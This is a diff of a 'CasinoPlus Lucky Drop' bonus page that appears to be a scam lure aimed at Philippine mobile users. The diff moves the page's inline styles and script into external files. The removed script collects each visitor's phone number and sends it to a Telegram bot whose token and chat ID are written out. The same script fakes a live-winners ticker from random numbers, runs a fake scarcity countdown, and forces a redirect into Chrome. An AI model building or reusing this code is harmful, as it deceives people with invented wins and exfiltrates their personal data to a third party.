@@ -5,65 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CasinoPlus | Lucky Drop</title>
     
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
 
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;900&display=swap" rel="stylesheet">
-    <style>
-        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%); --dark-bg: #060a13; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-
-        body { 
-            background-color: var(--dark-bg); 
-            background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, #060a13 100%); 
-            color: #fff; 
-            font-family: 'Public Sans', sans-serif; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            overflow: hidden; 
-            flex-direction: column;
-        }
-
-        /* LIVE WINNERS TICKER */
-        .live-winner-box { position: absolute; top: 20px; background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); animation: fadeInOut 3s infinite; z-index: 100; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
-        .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; margin: 0 2px; object-fit: contain; }
-
-        @keyframes fadeInOut { 0% { opacity: 0; transform: translateY(-15px); } 10% { opacity: 1; transform: translateY(0); } 90% { opacity: 1; } 100% { opacity: 0; } }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-
-        /* MAIN CARD */
-        .card { width: 92%; max-width: 380px; background: rgba(255, 255, 255, 0.05); border: 2px solid rgba(212, 175, 55, 0.5); border-radius: 28px; padding: 35px 24px; backdrop-filter: blur(20px); text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden; }
-        .card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.08) 50%, rgba(255,255,255,0) 100%); transform: rotate(30deg); animation: shimmer 4s infinite; pointer-events: none; }
-        @keyframes shimmer { 0% { transform: translateX(-100%) rotate(30deg); } 100% { transform: translateX(100%) rotate(30deg); } }
-
-        .logo-img { width: 170px; margin-bottom: 20px; }
-        h1 { font-size: 26px; font-weight: 900; margin-bottom: 5px; color: #fbbf24; text-shadow: 0 2px 10px rgba(251, 191, 36, 0.3); }
-        .promo-text { color: #cbd5e1; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-
-        /* SCARCITY BAR */
-        .scarcity-box { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }
-        .scarcity-text { font-size: 12px; color: #fbbf24; font-weight: 700; margin-bottom: 5px; display: flex; justify-content: space-between; }
-        .progress-bg { width: 100%; height: 6px; background: #334155; border-radius: 5px; overflow: hidden; }
-        .progress-bar { width: 85%; height: 100%; background: var(--gold); border-radius: 5px; transition: width 0.5s ease-in-out; }
-
-        /* BUTTON */
-        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 20px; border-radius: 16px; font-size: 16px; font-weight: 900; text-transform: uppercase; cursor: pointer; box-shadow: 0 6px 0 #8b6508; animation: btnPulse 2s infinite; }
-        .btn-main:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
-        .btn-main:disabled { background: #334155; box-shadow: none; color: #64748b; animation: none; cursor: not-allowed; }
-        @keyframes btnPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
-
-        /* MODAL */
-        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.95); z-index: 99999; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .modal-content { width: 92%; max-width: 380px; background: #0f172a; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); overflow: hidden; text-align: center; }
-        .promo-banner { width: 100%; height: 200px; object-fit: contain; background: #000; border-bottom: 2px solid #d4af37; padding: 10px; }
-        .modal-body { padding: 25px 20px; }
-        input { width: 100%; background: #000; border: 1px solid #334155; border-radius: 15px; padding: 18px; color: #fff; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 15px; outline: none; }
-        .trust-badge { font-size: 11px; color: #64748b; margin-top: 15px; }
-    </style>
+    
+    <!-- External CSS -->
+    <link rel="stylesheet" href="styles/instyle.css">
 </head>
 <body>
 
@@ -98,137 +49,7 @@
         </div>
     </div>
 
-    <script>
-        // 1. Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
-        const chatId = '7298607329';
-
-        function showBlockedUI(reason = "claimed") {
-            const overlay = document.getElementById('modalOverlay');
-            overlay.style.display = 'flex';
-            
-            let blockMessage = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
-            let title = "RESTRICTED";
-            
-            if (reason === "banned") {
-                title = "TERMINATED";
-                blockMessage = "⚠️ ACCESS_DENIED: This this number or device is already detect to a successful payout. ";
-            }
-
-            document.getElementById('modalBodyContent').innerHTML = `
-                <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
-                <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
-                <div style="font-size: 50px; margin: 20px 0;">🚫</div>
-                <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none; animation: none;" onclick="location.reload()">Device Locked</button>
-            `;
-            document.getElementById('mainCard').style.opacity = "0.2";
-            document.getElementById('mainCard').style.pointerEvents = "none";
-        }
-
-        window.onload = () => {
-            if (localStorage.getItem("cp_device_locked") === "true") {
-                showBlockedUI();
-            } else if (window.location.hash.includes("verified")) {
-                document.getElementById('modalOverlay').style.display = 'flex';
-            }
-        };
-
-        function handleVerify() {
-            if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
-            const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
-            if (!window.location.hash.includes("verified")) {
-                window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
-            } else {
-                document.getElementById('modalOverlay').style.display = 'flex';
-            }
-        }
-
-        async function processStep1() {
-            const phone = document.getElementById('userPhone').value.trim();
-            const btn = document.getElementById('claimBtn');
-
-            if (phone.length < 11 || !phone.startsWith('09')) return alert("Enter valid 11-digit number.");
-            
-            btn.disabled = true; 
-            btn.innerHTML = "CHECKING SECURE STATUS...";
-
-            db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
-                if (banSnap.exists()) {
-                    localStorage.setItem("cp_device_locked", "true");
-                    showBlockedUI("banned");
-                    return;
-                }
-
-                db.ref('user_logs/' + phone).once('value', async (snapshot) => {
-                    const userData = snapshot.val();
-
-                    if (userData && userData.status === 'claimed') {
-                        localStorage.setItem("cp_device_locked", "true");
-                        showBlockedUI();
-                        return;
-                    }
-
-                    const blockedList = window.BLACKLISTED_NUMBERS || [];
-                    if (blockedList.includes(phone)) {
-                        localStorage.setItem("cp_device_locked", "true");
-                        showBlockedUI();
-                        return;
-                    }
-
-                    db.ref('user_sessions/' + phone).once('value', s => {
-                        if(!s.exists()) {
-                            db.ref('user_sessions/' + phone).set({
-                                phone: phone,
-                                balance: 0,
-                                clicks: 0,
-                                hasShared: false,
-                                lastUpdate: Date.now()
-                            });
-                        } else {
-                            db.ref('user_sessions/' + phone).update({ lastUpdate: Date.now() });
-                        }
-                    });
-
-                    try {
-                        localStorage.setItem("userPhone", phone);
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
-                        localStorage.setItem("cp_verified", "true");
-                        btn.innerHTML = "SUCCESS...";
-                        setTimeout(() => { window.location.href = "main.html"; }, 1000);
-                    } catch (e) {
-                        localStorage.setItem("userPhone", phone);
-                        localStorage.setItem("cp_verified", "true");
-                        window.location.href = "main.html";
-                    }
-                });
-            });
-        }
-
-        setInterval(() => {
-            const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
-            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-            const amounts = [350, 500, 750, 1000, 1200];
-            const amount = amounts[Math.floor(Math.random() * amounts.length)];
-            const entry = document.getElementById('winnerEntry');
-            if(entry) {
-                entry.innerHTML = `User ${randomPrefix}***${randomSuffix} just claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱${amount}`;
-            }
-        }, 3500);
-
-        let count = 88;
-        setInterval(() => {
-            if(count > 15) {
-                count -= Math.floor(Math.random()*2) + 1;
-                const remNum = document.getElementById('remNum');
-                const pBar = document.getElementById('pBar');
-                if(remNum) remNum.innerText = count + "/100";
-                if(pBar) pBar.style.width = count + "%";
-            }
-        }, 5000);
-    </script>
+    <!-- External JavaScript -->
+    <script src="js/index.js"></script>
 </body>
 </html>
